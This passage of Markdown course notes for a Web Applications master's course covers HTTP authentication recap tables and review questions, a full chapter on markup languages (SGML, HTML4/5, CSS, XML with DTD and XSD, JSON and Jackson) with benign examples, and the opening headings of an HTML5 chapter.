> [!Important] AuthenticateUserDAO
> - Receives `username` and `password` in constructor
> - Queries DB to verify credentials
> - `outputParam` (boolean): `true` if authenticated, `false` otherwise
> - Separate DAO for authentication keeps concerns separated from employee DAOs

> [!Example] Using the Authenticated User
> Protected JSPs can check the session user and render different content:
>
> ```jsp
> <c:choose>
>   <c:when test="${empty sessionScope.user}">
>     <!-- unauthorized access page -->
>   </c:when>
>   <c:otherwise>
>     Welcome back, <c:out value="${sessionScope.user}"/>.
>   </c:otherwise>
> </c:choose>
> ```
>
> Protected servlets reuse the existing session with `req.getSession(false)`, read `ProtectedResourceFilter.USER_ATTRIBUTE`, and put the authenticated user into the logging context with `LogContext.setUser(user)`.

---

## Summary Table

| Topic | Standard/Technology | Key Detail |
|-------|---------------------|------------|
| URI | RFC 3986 | Generic identification; scheme + authority + path + query + fragment |
| URL | RFC 1738 | URI that also locates (network address) |
| URN | RFC 8141 | URI with `urn:` scheme; permanent name |
| IRI | RFC 3987 | URI extended with Unicode |
| Percent-Encoding | RFC 3986 | `%XX` hex encoding for reserved/non-ASCII chars |
| ASCII | ASA 1963 | 7 bits, 128 chars; English only |
| Extended ASCII | ISO 8859, 1987 | 8 bits, 256 chars; multiple incompatible variants |
| Unicode | Unicode Consortium, 1991 | Up to 32 bits; 172,849 chars (v18.0, 2026) |
| UTF-8 | ISO 1993 | Variable-width; backward-compat with ASCII |
| MIME | RFC 2045/2046 | Media type + encoding standard; `type/subtype` |
| `multipart/mixed` | RFC 2046 | Independent parts bundled (email + attachment) |
| `multipart/form-data` | RFC 7578 | File upload + form fields |
| `application/x-www-form-urlencoded` | HTML 4.01 | Form fields only; percent-encoded |
| Jakarta Part API | Servlet 5.0+ | `req.getParts()` → `Part.getInputStream()` |
| Multipart upload config | `web.xml` | `max-file-size`, `max-request-size`, `file-size-threshold` |
| Jakarta Mail 2.1 | EE 9+ | `MimeMessage`, `Transport.send()`, SMTP |
| `MailManager` SMTP setup | Jakarta Mail | `smtp`, STARTTLS, optional `PasswordAuthentication` |
| HTTP | RFC 2068 | Stateless, textual, request-response |
| Safe methods | HTTP/1.1 | GET, HEAD, OPTIONS — no side effects |
| Idempotent methods | HTTP/1.1 | GET, HEAD, OPTIONS, DELETE, PUT |
| HTTP Basic Auth | RFC 7235 | `user:pass` Base64-encoded; NOT encrypted |
| `ProtectedResourceFilter` | Jakarta Filter | `implements Filter`; `doFilter()` chain pattern |
| `HttpSession` | Jakarta Servlet | Key-value store per user session; `getSession(false)` |
| `sessionScope.user` | JSP EL | Read authenticated user in protected JSPs |
| `AuthenticateUserDAO` | DAO pattern | DB-backed credential check; `outputParam` boolean |

## Questions

1. How do HTML, HTTP, MIME, and URL work together as the four basic technologies of the Web?
2. How would you distinguish URI, URL, URN, and IRI using examples?
3. What information is encoded in the general URI syntax, and how do path, query, and fragment serve different purposes?
4. Why is percent-encoding necessary, and how does it relate to reserved characters and non-ASCII text?
5. How did the limitations of ASCII and Extended ASCII lead to Unicode and UTF-8?
6. Why is UTF-8 backward-compatible with ASCII, and why is that useful for the Web?
7. What does MIME add to HTTP and email communication, especially through `Content-Type`, `Content-Disposition`, and multipart bodies?
8. How does `multipart/form-data` represent form fields and uploaded files differently from `application/x-www-form-urlencoded`?
9. How does the Jakarta `Part` API expose uploaded files and form fields to a servlet?
10. Why must uploaded file MIME types be validated server-side, even when an HTML form restricts accepted file types?
11. How does the extended Employee example process a multipart request, store a photo, send a confirmation email, and later stream the photo back to the browser?
12. Why is an email with an attachment represented as `multipart/mixed`, and how do `MimeMultipart` and `MimeBodyPart` model that structure?
13. What does it mean for HTTP to be stateless, textual, and request-response based?
14. How do safe, idempotent, and cacheable properties differ across HTTP methods?
15. How should status code classes `2xx`, `3xx`, `4xx`, and `5xx` guide client and server behavior?
16. Why is HTTP Basic Authentication unsafe without HTTPS, despite using Base64 encoding?
17. How does `ProtectedResourceFilter` use `Authorization`, `WWW-Authenticate`, `HttpSession`, and `AuthenticateUserDAO` to protect `/protected/*` resources?

# 10 — Markup Languages

_Source: `10-webapp-2025-26-markup.pdf` — Web Applications, Master Degree, A.Y. 2025/2026, Prof. Nicola Ferro_

---

## Table of Contents

- [[#Markup — Definition and Types|Markup — Definition and Types]]
  - [[#Types of Markup|Types of Markup]]
- [[#SGML|SGML]]
  - [[#SGML Example|SGML Example]]
- [[#HTML|HTML]]
  - [[#HTML4 — Problems|HTML4 — Problems]]
  - [[#HTML5|HTML5]]
- [[#CSS — Brief Introduction|CSS — Brief Introduction]]
- [[#XML|XML]]
  - [[#XML Document Structure — Tree Model|XML Document Structure — Tree Model]]
  - [[#XML Node Types|XML Node Types]]
  - [[#Textual Representation of Nodes|Textual Representation of Nodes]]
  - [[#Well-Formed and Valid XML|Well-Formed and Valid XML]]
  - [[#Parsing XML — DOM SAX StAX|Parsing XML — DOM, SAX, StAX]]
  - [[#Java Binding of DOM|Java Binding of DOM]]
  - [[#Document Type Definition DTD|Document Type Definition (DTD)]]
  - [[#XML Namespaces|XML Namespaces]]
  - [[#XML Schema|XML Schema]]
- [[#JSON|JSON]]
  - [[#JSON Structures|JSON Structures]]
  - [[#JSON Schema|JSON Schema]]
  - [[#Processing JSON in Java — Jackson|Processing JSON in Java — Jackson]]
- [[#Summary Table|Summary Table]]

---

## Markup — Definition and Types

> [!Important] Markup
> "Whenever an author writes anything, he or she **marks it up**."
>
> — Coombs, Renear, and DeRose (1987). *Markup Systems and the Future of Scholarly Text Processing.* CACM 30(11):933–947.
>
> Markup is **not part of the text** or content — it tells us something *about* it. Digital formats allow markup technologies geared toward **automatic processing of information**, beyond what traditional writing systems provide.
>
> **Examples:** spaces (separate words), commas (separate phrases), periods (end sentences) — all are markup tags.

### Types of Markup

| Type | Description | Example |
|------|-------------|---------|
| **No markup** | Used in ancient writing (scriptio continua, boustrophedon); no space for separators | Ancient manuscripts |
| **Punctuational** | Closed set of marks for primarily syntactic information | `.`, `,`, `?`, `!` |
| **Presentational** | Actual layout on a page: spacing, folios, page breaks, list enumeration | Line breaks, indentation |
| **Procedural** | Commands indicating *how* to format text | `.sk 3 a;.in +10 -10` (troff) |
| **Descriptive** | Defines *type or class* of content — intended use, not appearance | `<blockquote>`, `<h1>` |
| **Referential** | Refers to entities external to the document; replaced during processing | `&copy;`, `&amp;`, XML entity refs |
| **Meta-markup** | Controls interpretation of markup; extends vocabulary of descriptive languages | SGML, DTD, XML Schema |

> [!Important] Procedural vs Descriptive
> - **Procedural**: "make this text bold" — ties content to a specific presentation
> - **Descriptive**: "this text is a quotation" — decouples content from presentation; renderer decides how to show it
> - Modern web standards (HTML5 + CSS) push toward descriptive markup with separate presentation layer

---

## SGML

> [!Important] SGML — Standard Generalized Markup Language
> **Features:**
> - Descriptive and referential markup language
> - **Meta-markup language**: languages derived from SGML are called *applications* (e.g., HTML, XML)
> - Introduces **Document Type Definition (DTD)**: mechanism to define tags and document structure; used to validate document well-formedness
>
> **History:**
> - Derives from **GML** (Generalized Markup Language), developed by Goldfarb, Mosher, and Lorie at IBM in 1974
> - ANSI standard: 1983
> - ISO standard: 1986

### SGML Example

> [!Example] PostgreSQL documentation source in SGML
> PostgreSQL documentation is an example of real SGML usage. The source file
> `doc/src/sgml/query.sgml` uses descriptive tags to structure the manual:
>
> ```sgml
> <chapter id="queries">
>  <title>Queries</title>
>
>  <sect1 id="queries-overview">
>   <title>Overview</title>
>   <para>
>    The process of retrieving or the command to retrieve data from a
>    database is called a <firstterm>query</firstterm>.
>   </para>
>  </sect1>
> </chapter>
> ```
>
> Tags such as `<chapter>`, `<sect1>`, `<para>`, `<xref>`, `<literal>`,
> `<filename>`, `<application>`, `<screen>`, `<prompt>`, `<userinput>`, and
> `<computeroutput>` describe the role of document fragments rather than their
> final visual rendering.

---

## HTML

> [!Important] HTML4
> - Markup language to create **hypertextual Web pages**
> - Defines both **structure/content** and **presentation** of a Web page
> - An **application of SGML**
> - HTML4 is: procedural, descriptive, referential
>
> Reference: W3C (1999). *HTML 4.01 Specification.* W3C Recommendation.

> [!Example] Example of HTML4
> ```html
> <html>
>  <head>
>   <title>Title of the Example Page</title>
>  </head>
>  <body>
>   <h1>Example of HTML</h1>
>   <p>Body of the text <font color="red">in red.</font></p>
>   <p>Copyright &copy; 2018 - Nicola Ferro
>    (<a href="mailto:ferro@dei.unipt.it">ferro@dei.unipt.it</a>)
>   </p>
>  </body>
> </html>
> ```
> - `<font color="red">` is **procedural** markup — mixes presentation into content
> - `&copy;` is **referential** markup — replaced by © during processing
> - `<h1>`, `<p>` are **descriptive** markup

### HTML4 — Problems

> [!Warning] Problems of HTML4
> 1. **Loose code parsing**: browsers use heuristics for missing/swapped tags → incompatibilities across browsers
> 2. **No separation between content and presentation**: difficulty reusing content across contexts (desktop, mobile); tags like `<h1>` or `<table>` abused for visual effect
> 3. **No semantic description**: a machine cannot distinguish `"Nicola Ferro"` (person) from `ferro@dei.unipd.it` (email)
> 4. **Not a meta-markup language**: extension only via *microformats* (abusing `class` attributes)
>
> **CSS** was introduced to address the content/presentation separation issue.
>
> **Microformat workaround:**
> ```html
> <div class="vcard">
>   Copyright &copy; 2018 - <span class="fn">Nicola Ferro</span>
>   (<a class="email" href="mailto:ferro@dei.unipt.it">ferro@dei.unipt.it</a>)
> </div>
> ```

### HTML5

> [!Important] HTML5
> Re-design of HTML4 to **clearly separate structure/content from presentation**.
>
> **New features:**
> - Tighter integration with **CSS** (presentation) and **JavaScript** (interaction)
> - Semantic tags describing document parts: `<header>`, `<nav>`, `<article>`, `<section>`, `<footer>`
> - New form elements: `<input type="color|number|email|date">`
> - Native **audio** and **video** support
> - **SVG** and `<canvas>` for graphics
> - **Web Store** — improved local storage over cookies
>
> HTML5 is: procedural, descriptive, referential.
>
> Reference: W3C (2024). *HTML Living Standard.* https://html.spec.whatwg.org/multipage/

> [!Example] HTML5 structure
> ```html
> <!DOCTYPE html>
> <html lang="en">
>  <head>
>   <title>Title of the Example Page</title>
>   <meta charset="UTF-8">
>  </head>
>  <body>
>   <header>
>    <h1>Example of HTML</h1>
>   </header>
>   <nav>
>    <a href="home.html">Home</a>
>    <a href="contact.html">Contact</a>
>   </nav>
>   <article>
>    <p>Body of the article</p>
>    <section>
>     <p>Body of a section of the article</p>
>    </section>
>   </article>
>  </body>
> </html>
> ```
> Note: `<!DOCTYPE html>` triggers standards mode in browsers.

---

## CSS — Brief Introduction

> [!Important] CSS — Cascading Style Sheets
> CSS separates presentation from content. Introduced to fix HTML4's mixing of layout and structure.
>
> ```html
> <head>
>   <style type="text/css">
>     .important { color: red; }
>   </style>
> </head>
> <body>
>   <p>Body of the text <span class="important">in rosso.</span></p>
> </body>
> ```
> - HTML provides **semantic structure** (`<span class="important">`)
> - CSS provides **presentation rules** (`.important { color: red; }`)
>
> Reference: W3C (2011). *CSS 2.1 Specification.* W3C Recommendation.

---

## XML

> [!Important] XML — eXtensible Markup Language
> - Markup language for **representing and exchanging information**, geared toward interoperability among distributed systems
> - Data in XML is **semi-structured**: between rigid (database) and unstructured (full text)
> - An **application of SGML**
> - **Typed language** with two schema mechanisms:
>   - **DTD** (Document Type Definition) — borrowed from SGML
>   - **XML Schema (XSD)** — based on XML syntax
> - As markup: descriptive, referential, **meta-markup**
>
> Reference: W3C (2006). *XML 1.1 (Second Edition).* W3C Recommendation.

### XML Document Structure — Tree Model

![[markup-xml-tree.jpg|560]]
*Figure 1: Tree representation of an RSS XML document*

> [!Example] RSS XML document
> ```xml
> <?xml version="1.0"?>
> <rss version="2.0">
>  <channel>
>   <title>Grid@CLEF News</title>
>   <link>http://ims.dei.unipd.it/gridclef/</link>
>   <description>Events and updates about the Grid@CLEF track.</description>
>   <item>
>    <title>Terrier Support for Grid@CLEF</title>
>    <pubDate>Wed, 11 Feb 2009 15:41:49 GMT</pubDate>
>    <link>http://ir.dcs.gla.ac.uk/terrier/issues/browse/TR-9</link>
>    <guid isPermaLink="false">1234363309</guid>
>    <description>The Terrier open source IR system will support CIRCO.</description>
>   </item>
>   <item>
>    <title>Registration to Grid@CLEF 2009 opens</title>
>    <pubDate>Wed, 4 Feb 2009 00:00:00 GMT</pubDate>
>    <link>http://www.clef-campaign.org/</link>
>    <guid isPermaLink="false">1233705600</guid>
>    <description>Registration for Grid@CLEF 2009 opens today.</description>
>   </item>
>  </channel>
> </rss>
> ```
>
> The same RSS feed can be rendered in a Web page, opened by a browser/feed
> reader, or subscribed to in a mail client. XML remains the source data; the
> client decides how to present it.

### XML Node Types

| Node Type | Description | Syntax |
|-----------|-------------|--------|
| **Text** | Fragment of unstructured information | Literal text content |
| **Element** | Contains other nodes; logical grouping | `<element>...</element>` or `<empty-element/>` |
| **Attribute** | Property of an element; in opening tag only; not duplicable | `name="value"` |
| **Comment** | Textual content ignored during processing | `<!-- comment -->` |
| **Processing Instruction** | Meta-directive for the XML processor; defines target + data | `<?target value?>` |
| **Root** | The whole XML tree — implicit (not written) | — |

### Textual Representation of Nodes

```xml
<?xml version="1.0"?>          <!-- Processing instruction (roughly) -->

<rss version="2.0">            <!-- Element; version="2.0" is an Attribute -->
 <channel>
  <title>Grid@CLEF News</title> <!-- title = Element; "Grid@CLEF News" = Text -->
  <!-- this is a comment -->
 </channel>
</rss>
```

- **Empty element**: `<empty-element></empty-element>` ⟺ `<empty-element/>`
- **Attribute**: must be in opening tag only; value must be quoted: `<x id="100">` ✓ `<x id=100>` ✗

### Well-Formed and Valid XML

> [!Important] Well-Formed vs Valid
> **Well-formed** (mandatory for all XML):
> - Opening and closing tags must **match** and be **properly nested**: `<x><y>…</y></x>` ✓ — `<x><y>…</x></y>` ✗
> - Attribute values must be **enclosed by quotes**
> - There must be a **unique root element**
>
> **Valid** (optional, requires DTD or XML Schema):
> - Document complies with constraints expressed in its document type definition
> - Validity checked by a parser using the DTD/Schema

### Parsing XML — DOM, SAX, StAX

> [!Important] Three XML Parsing Approaches
> | Feature | DOM | SAX | StAX |
> |---------|-----|-----|------|
> | API Type | In-memory Tree | Streaming, Push | Streaming, Pull |
> | Ease of Use | High | Medium | High |
> | CPU and Memory | Medium | Low | Low |
> | Direction | Bi-directional | Forward only | Forward only |
> | Read | Yes | Yes | Yes |
> | Write | Yes | "No" | Yes |
>
> - **DOM**: builds entire tree in memory; supports random access and modification
> - **SAX**: application registers callbacks; parser fires events (`startElement`, `endElement`, …)
> - **StAX**: application drives iteration, pulling tokens one at a time (similar to Jackson for JSON)

> [!Important] DOM — Document Object Model
> - Platform/language-independent model and API for HTML and XML documents
> - Expressed using **IDL** (Interface Definition Language)
> - Bindings in JavaScript, Java, PHP, and others
> - Used by **browsers** to parse, represent, and render HTML
> - W3C recommendation; updated to align with HTML5
>
> Reference: W3C (1998). *DOM Level 1 Specification.* W3C Recommendation.

![[markup-dom-interfaces.jpg|580]]
*Figure 2: DOM interface hierarchy starting from Node*

| DOM Interface | Represents |
|---------------|-----------|
| `Node` | Generic XML node — base interface |
| `Document` | The XML document (root of tree) |
| `Element` | Node of type element |
| `Attr` | Node of type attribute |
| `CharacterData` | Abstract; parent of text-like nodes |
| `Text` | Node of type text |
| `Comment` | Node of type comment |
| `ProcessingInstruction` | Node of type processing instruction |

### Java Binding of DOM

> [!Important] DOM in Java
> Java exposes the DOM API through the `org.w3c.dom` package. It provides Java
> bindings for DOM Core interfaces, including DOM Level 2 Core, DOM Level 3
> Core, and DOM Level 3 Load and Save.

| Java DOM Interface | Meaning |
|--------------------|---------|
| `Document` | Represents the entire HTML/XML document |
| `Element` | Represents an element in an HTML/XML document |
| `Node` | Primary datatype for the whole DOM tree |

Important `Node` methods:

- `getAttributes()` returns the node attributes as a `NamedNodeMap` if the node is an `Element`; otherwise it returns `null`
- `getChildNodes()` returns the node children as a `NodeList`
- `getFirstChild()` / `getLastChild()` return the first or last child node
- `getNextSibling()` returns the next sibling node
- `getNodeName()`, `getNodeType()`, and `getNodeValue()` expose the node identity and value
- `getOwnerDocument()` returns the associated `Document`
- `getParentNode()` returns the parent node

### Document Type Definition (DTD)

> [!Important] DTD — Document Type Definition
> A set of **markup declarations** expressing the structure of an XML document:
> - What each element may contain (order, quantity, optional/mandatory)
> - Allowed elements; attributes and their valid values
> - Used by a parser to **validate** documents
> - May be external (separate file) or inline
> - Associated via **DOCTYPE declaration** at start of document
>
> **DTD syntax uses regular-expression-inspired notation:**

| Declaration | Syntax | Meaning |
|-------------|--------|---------|
| Element | `<!ELEMENT name model>` | Defines element with given name and content model |
| Attribute list | `<!ATTLIST element attr type default>` | Defines attribute of an element |
| DOCTYPE | `<!DOCTYPE root SYSTEM "URI">` | Links DTD to document |

**Content model operators:**

| Symbol | Meaning |
|--------|---------|
| `,` | Sequence (ordered) |
| `\|` | Choice (either/or) |
| `?` | Zero or one |
| `*` | Zero or more |
| `+` | One or more |
| `#PCDATA` | Parsed character data (text) |
| `CDATA` | Character data (attribute value) |
| `#FIXED` | Fixed value attribute |
| `#REQUIRED` | Required attribute |

> [!Example] DTD for RSS
> ```xml
> <!-- in rss.dtd -->
> <!ELEMENT rss (channel)>
> <!ATTLIST rss version CDATA #FIXED "2.0">
>
> <!ELEMENT channel (title, link, description, item+)>
>
> <!ELEMENT title (#PCDATA)>
> <!ELEMENT link (#PCDATA)>
> <!ELEMENT description (#PCDATA)>
> <!ELEMENT pubDate (#PCDATA)>
>
> <!ELEMENT item (title, pubDate, link, guid, description)>
>
> <!ELEMENT guid (#PCDATA)>
> <!ATTLIST guid isPermaLink (true | false) "false">
> ```
> Referenced in XML: `<?xml version="1.0"?> <!DOCTYPE rss SYSTEM "rss.dtd">`

> [!Warning] Limitations of DTD
> - No mechanism for **data types** in elements/attributes
> - Attribute/element declarations are **context-independent** (can't constrain based on other values)
> - Uses a **non-XML syntax** (different from XML itself)
> - No **namespace support**
> - No **auto-documentation** support
>
> → XML Schema (XSD) was designed to address all these limitations.

### XML Namespaces

> [!Important] XML Namespaces
> When mixing multiple XML languages in one document, element names can **clash**.
> XML Namespaces use **URIs** as unique namespace identifiers + short **prefix** aliases.
>
> Syntax: `xmlns:prefix="URI"` (or `xmlns="URI"` for default namespace)
>
> Reference: W3C (2009). *Namespaces in XML 1.0 (Third Edition).* W3C Recommendation.

> [!Example] Mixing RSS and HTML namespaces
> ```xml
> <?xml version="1.0"?>
> <rss version="2.0"
>      xmlns:html="http://www.w3.org/TR/html4"
>      xmlns="http://www.rssboard.org">  <!-- default namespace -->
>   <channel>
>     <title>Grid@CLEF News</title>  <!-- in default (RSS) namespace -->
>     <item>
>       <description>
>         <html:html>
>           <html:head>
>             <html:title>IR Blog</html:title>  <!-- html: prefix → HTML namespace -->
>           </html:head>
>         </html:html>
>       </description>
>     </item>
>   </channel>
> </rss>
> ```
> - `xmlns:html="..."` declares `html:` as alias for the HTML namespace URI
> - `xmlns="..."` declares the default namespace (no prefix needed for RSS elements)
> - **URI is not dereferenced** — only used as a unique string identifier

### XML Schema

> [!Important] XML Schema (XSD)
> Alternative to DTD — describes XML document structure using **XML syntax**.
>
> Supports:
> - **Simple and complex types** (including built-in: `xs:string`, `xs:integer`, `xs:boolean`, `xs:anyURI`, `xs:ID`, …)
> - **Elements** with simple or complex type; **attributes** with simple type
> - Content models: `xs:sequence`, `xs:choice`, `xs:all`
> - Occurrence constraints: `minOccurs`, `maxOccurs` (including `unbounded`)
>
> Linked via `xsi:schemaLocation` in root element:
> ```xml
> <?xml version="1.0"?>
> <rss:rss xmlns:rss="http://www.rssboard.org"
>          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
>          xsi:schemaLocation="http://www.rssboard.org rss.xsd"
>          version="2.0">
>   ...
> </rss:rss>
> ```
> - `xmlns:xsi` imports the XML Schema Instance namespace
> - `xsi:schemaLocation` = two values separated by space: namespace URI + schema file location

> [!Example] XML Schema for RSS (key parts)
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <xs:schema xmlns:rss="http://www.rssboard.org"
>            xmlns:xs="http://www.w3.org/2001/XMLSchema"
>            targetNamespace="http://www.rssboard.org"
>            elementFormDefault="unqualified"
>            attributeFormDefault="unqualified">
>
>   <xs:element name="rss">
>     <xs:complexType>
>       <xs:sequence>
>         <xs:element ref="rss:channel"/>
>       </xs:sequence>
>       <xs:attribute name="version" type="xs:string" use="required" fixed="2.0"/>
>     </xs:complexType>
>   </xs:element>
>
>   <xs:element name="channel">
>     <xs:complexType>
>       <xs:sequence>
>         <xs:element ref="rss:title"/>
>         <xs:element ref="rss:link"/>
>         <xs:element ref="rss:description"/>
>         <xs:element ref="rss:item" maxOccurs="unbounded"/>
>       </xs:sequence>
>     </xs:complexType>
>   </xs:element>
>
>   <xs:element name="title" type="xs:string"/>
>   <xs:element name="link"  type="xs:anyURI"/>
>
>   <xs:element name="guid">
>     <xs:complexType>
>       <xs:simpleContent>
>         <xs:extension base="xs:ID">
>           <xs:attribute name="isPermaLink" type="xs:boolean" default="false"/>
>         </xs:extension>
>       </xs:simpleContent>
>     </xs:complexType>
>   </xs:element>
>
>   <xs:element name="pubDate" type="xs:string"/>
> </xs:schema>
> ```
>
> References: W3C (2012), *XML Schema Definition Language (XSD) 1.1 Part 1:
> Structures* and *Part 2: Datatypes*.

---

## JSON

> [!Important] JSON — JavaScript Object Notation
> - Lightweight **data-interchange format**
> - Based on a subset of the JavaScript programming language
> - **Browsers automatically parse JSON into JavaScript objects**
> - Completely **language-independent** text format
> - Built on two structures:
>   - **Object**: unordered collection of `name: value` pairs — `{ "key": value, ... }`
>   - **Array**: ordered list of values — `[ value, value, ... ]`
>
> Standards: ECMA-404 (2017); RFC 8259 (Bray, 2017).

### JSON Structures

![[markup-json-object-syntax.jpg|620]]
*Figure 3: Railroad diagram for JSON object syntax*

![[markup-json-array-value-syntax.jpg|520]]
*Figure 4: Railroad diagram for JSON array and value syntax*

| JSON Type | Syntax | Example |
|-----------|--------|---------|
| **Object** | `{ "key": value }` | `{"name": "Rossi", "age": 34}` |
| **Array** | `[ value, ... ]` | `[1, 2, 3]` |
| **String** | `"..."` | `"hello"` |
| **Number** | integer or float | `42`, `3.14` |
| **Boolean** | `true` \| `false` | `true` |
| **Null** | `null` | `null` |

> [!Example] XML vs JSON — same data
> ```xml
> <widget>
>     <debug>on</debug>
>     <window title="Sample Konfabulator Widget">
>         <name>main_window</name>
>         <width>500</width>
>         <height>500</height>
>     </window>
>     <image src="Images/Sun.png">
>         <name>sun1</name>
>         <hOffset>250</hOffset>
>         <vOffset>250</vOffset>
>         <alignment>center</alignment>
>     </image>
>     <text data="Click Here">
>         <size>36</size>
>         <style>bold</style>
>         <name>text1</name>
>         <hOffset>250</hOffset>
>         <vOffset>100</vOffset>
>         <alignment>center</alignment>
>     </text>
> </widget>
> ```
> ```json
> {"widget": {
>     "debug": "on",
>     "window": {
>         "title": "Sample Konfabulator Widget",
>         "name": "main_window",
>         "width": 500,
>         "height": 500
>     },
>     "image": {
>         "src": "Images/Sun.png",
>         "name": "sun1",
>         "hOffset": 250,
>         "vOffset": 250,
>         "alignment": "center"
>     },
>     "text": {
>         "data": "Click Here",
>         "size": 36,
>         "style": "bold",
>         "name": "text1",
>         "hOffset": 250,
>         "vOffset": 100,
>         "alignment": "center"
>     }
> }}
> ```
> JSON is more compact; no closing tags; attributes and child elements merged into same namespace.

### JSON Schema

> [!Important] JSON Schema
> A JSON media type for defining the **structure of JSON data**.
> Supports: validation, documentation, hyperlink navigation, interaction control.
>
> ```json
> {
>   "type": "object",
>   "properties": {
>     "first_name": { "type": "string" },
>     "last_name":  { "type": "string" },
>     "birthday":   { "type": "string", "format": "date-time" },
>     "address": {
>       "type": "object",
>       "properties": {
>         "street_address": { "type": "string" },
>         "city":    { "type": "string" },
>         "state":   { "type": "string" },
>         "country": { "type": "string" }
>       }
>     }
>   }
> }
> ```
>
> Reference: Wright et al. (2022). *JSON Schema.* RFC draft-bhutton-json-schema-01.

### Processing JSON in Java — Jackson

> [!Important] Jackson — Streaming JSON Processor
> JSON is usually parsed using a **pull streaming API** (similar to StAX for XML).
>
> Main Java libraries:
> - **Jackson Project**: `com.fasterxml.jackson.core`
> - **Jakarta JSON Processing 2.1 (JSON-P)** under Jakarta EE 10
>
> The `com.fasterxml.jackson.core` package is the core public streaming API:
> `JsonFactory` configures and creates reader/parser and writer/generator
> instances, while `JsonParser` and `JsonGenerator` perform token-based reading
> and writing.

![[markup-jackson-core-api.jpg|560]]
*Figure 5: Overview of the main classes in the com.fasterxml.jackson.core package*

![[markup-jackson-jsonparser-api.jpg|560]]
*Figure 6: Main methods of Jackson JsonParser*

| Jackson Class | Role |
|---------------|------|
| `JsonFactory` | Main factory — creates `JsonParser` and `JsonGenerator` instances |
| `JsonParser` | Pull streaming API for **reading** JSON content |
| `JsonGenerator` | Streaming API for **writing** JSON content |
| `JsonToken` | Enum of token types: `START_OBJECT`, `END_OBJECT`, `FIELD_NAME`, `VALUE_STRING`, `VALUE_NUMBER_INT`, … |

| API | Representative methods |
|-----|------------------------|
| `JsonParser` | `nextToken()`, `nextFieldName()`, `getValueAsInt(int def)`, `getValueAsString()`, `hasCurrentToken()`, `isClosed()` |
| `JsonGenerator` | `writeStartObject()`, `writeFieldName(...)`, `writeArray(...)`, `writeBinary(...)`, `writeEndArray()`, `writeEndObject()` |

> [!Example] Jackson JsonParser pattern (used in REST Employee example)
> ```java
> final JsonParser jp = JSON_FACTORY.createParser(in);
>
> // advance to the "employee" field
> while (jp.getCurrentToken() != JsonToken.FIELD_NAME || !"employee".equals(jp.getCurrentName())) {
>     if (jp.nextToken() == null) throw new EOFException("No Employee object found.");
> }
>
> // read fields inside employee object
> while (jp.nextToken() != JsonToken.END_OBJECT) {
>     if (jp.getCurrentToken() == JsonToken.FIELD_NAME) {
>         switch (jp.getCurrentName()) {
>             case "badge":   jp.nextToken(); jBadge   = jp.getIntValue(); break;
>             case "surname": jp.nextToken(); jSurname = jp.getText();     break;
>         }
>     }
> }
> ```

---

## Summary Table

| Technology | Type | Parent Standard | Key Feature | Schema Mechanism |
|------------|------|-----------------|-------------|-----------------|
| **SGML** | Meta-markup language | GML (IBM, 1974) | Defines DTD concept; parent of HTML and XML; used for structured manuals such as PostgreSQL docs | DTD |
| **HTML4** | Markup application of SGML | SGML | Web pages; mixes content and presentation | none (loose) |
| **HTML5** | Evolved HTML | SGML/HTML4 | Separates content from presentation; semantic tags | none (loose) |
| **CSS** | Style language | W3C recommendation | Presentation rules decoupled from HTML structure | — |
| **XML** | Meta-markup application of SGML | SGML | Semi-structured data exchange; interoperability | DTD or XSD |
| **DTD** | Document type language | SGML | Validates XML structure; non-XML syntax; no data types | — |
| **XML Schema (XSD)** | Document type language | W3C recommendation | Validates XML; XML syntax; rich data types; namespace support | — |
| **XML Namespace** | XML mechanism | W3C recommendation | Prevents element name clashes when mixing languages | — |
| **DOM** | XML/HTML API | W3C recommendation | In-memory tree; bi-directional; Java binding in `org.w3c.dom` | — |
| **SAX** | XML parsing API | Open source | Push streaming; callbacks; low memory | — |
| **StAX** | XML parsing API | JSR-173 | Pull streaming; low memory; writable | — |
| **JSON** | Data interchange format | ECMA-404, RFC 8259 | Lightweight; objects + arrays; browser-native | JSON Schema |
| **JSON Schema** | Validation format | RFC draft | Structural validation of JSON | — |
| **Jackson** | Java JSON library | FasterXML | Streaming pull API: `JsonFactory` → `JsonParser`/`JsonGenerator` | — |

## Questions

1. What does it mean to say that markup is not part of the text but tells us something about the text?
2. How do punctuational, presentational, procedural, descriptive, referential, and meta-markup differ?
3. Why is descriptive markup more reusable than procedural markup in web documents?
4. How did SGML influence HTML and XML, and what role did DTDs play in that lineage?
5. Which problems in HTML4 motivated the stronger separation between structure, presentation, and behavior in HTML5?
6. How does CSS help solve the content-versus-presentation problem shown by tags such as `<font>`?
7. How does the XML tree model represent elements, attributes, text, comments, processing instructions, and the root?
8. What is the difference between a well-formed XML document and a valid XML document?
9. How do DOM, SAX, and StAX differ in memory usage, direction of processing, and control flow?
10. What does the DOM interface hierarchy reveal about the common structure of XML and HTML documents?
11. How do DTD content model operators such as `,`, `|`, `?`, `*`, and `+` constrain XML structure?
12. Why were XML Schema and namespaces introduced, and which limitations of DTDs do they address?
13. How do JSON objects and arrays represent structured data more compactly than XML?
14. What can JSON Schema specify about JSON data, and why is schema validation useful for web APIs?
15. How does Jackson's pull parsing pattern resemble StAX, and why is it suitable for streaming JSON in Java?

# HTML5 — Web Applications 2025-26

## Table of Contents

- [[#Introduction to HTML|Introduction to HTML]]
  - [[#DOCTYPE Declaration|DOCTYPE Declaration]]
  - [[#HTML Base Structure|HTML Base Structure]]
  - [[#Meta Elements|Meta Elements]]
  - [[#Document Structure Elements|Document Structure Elements]]
- [[#Markup Types|Markup Types]]
  - [[#Structural Markup|Structural Markup]]
  - [[#Semantic Markup|Semantic Markup]]
  - [[#Block and Inline Elements|Block and Inline Elements]]
- [[#Main Elements|Main Elements]]
  - [[#Text Elements|Text Elements]]
  - [[#Lists|Lists]]
  - [[#Links|Links]]
  - [[#Images|Images]]
  - [[#Tables|Tables]]
  - [[#Forms|Forms]]
- [[#Extra Markup|Extra Markup]]
  - [[#Comments|Comments]]
  - [[#Class Attribute|Class Attribute]]
  - [[#div and span|div and span]]
- [[#HTML5 New Elements|HTML5 New Elements]]
  - [[#New HTML5 Element List|New HTML5 Element List]]
  - [[#Semantic Layout Elements|Semantic Layout Elements]]
  - [[#HTML4 vs HTML5 Layout|HTML4 vs HTML5 Layout]]
  - [[#HTML5 APIs|HTML5 APIs]]
  - [[#Video|Video]]
  - [[#Audio|Audio]]
  - [[#Canvas|Canvas]]
- [[#Take Away and Resources|Take Away and Resources]]
- [[#Summary Table|Summary Table]]

---

## Introduction to HTML

### DOCTYPE Declaration

